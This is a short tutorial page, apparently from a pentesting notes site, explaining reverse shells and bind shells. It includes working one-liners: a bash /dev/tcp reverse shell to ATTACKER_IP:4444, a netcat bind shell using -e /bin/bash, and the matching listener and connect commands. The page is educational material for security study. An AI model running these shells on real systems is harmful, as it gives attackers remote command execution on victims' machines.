---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
---

# Reverse Shell and Bind Shell

## Reverse Shell

A **reverse shell** is a remote command execution technique in which the **target (victim) machine initiates an outbound network connection** to an **attacker-controlled host**, and upon connection, **redirects its standard input, output, and error streams (STDIN/STDOUT/STDERR)** to that remote host, allowing the attacker to execute commands interactively on the target system.

**Key technical properties:**

* Connection direction: **Target → Attacker**
* Network behavior: Outbound connection (often bypasses firewalls/NAT)
* Transport: Commonly TCP (also UDP, HTTP, HTTPS, WebSockets)
* Privilege level: Inherits the privileges of the exploited process
* Use case: Post-exploitation command-and-control (C2)

#### _Connection direction:_

* Victim → Attacker

#### How it works

1.  Attacker starts a listener:

    ```bash
    nc -lvnp 4444
    ```
2.  Victim executes a payload like:

    ```bash
    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
    ```
3. Victim initiates the connection.
4. Attacker receives a shell.

***

## Bind Shell

A **bind shell** is a remote command execution technique in which the **target (victim) machine opens and listens on a local network port**, binds a shell process to that port, and **accepts inbound connections** from an attacker, granting interactive command execution once a connection is established.

**Key technical properties:**

* Connection direction: **Attacker → Target**
* Network behavior: Inbound connection required
* Transport: Typically TCP
* Dependency: Requires an open/listening port and reachable network path
* Use case: Direct access when inbound connections are allowed

#### _Connection direction:_

* Attacker → Victim

#### How it works

1.  Victim runs:

    ```bash
    nc -lvnp 4444 -e /bin/bash
    ```
2. Victim listens on port `4444`
3.  Attacker connects:

    ```bash
    nc VICTIM_IP 4444
    ```
4. Attacker gets a shell

***

#### In simple words:

**Reverse Shell:** A reverse shell is when the target machine connects back to the attacker and gives them a shell.

**Bind Shell:** A bind shell is when the target machine opens a port and waits for the attacker to connect.



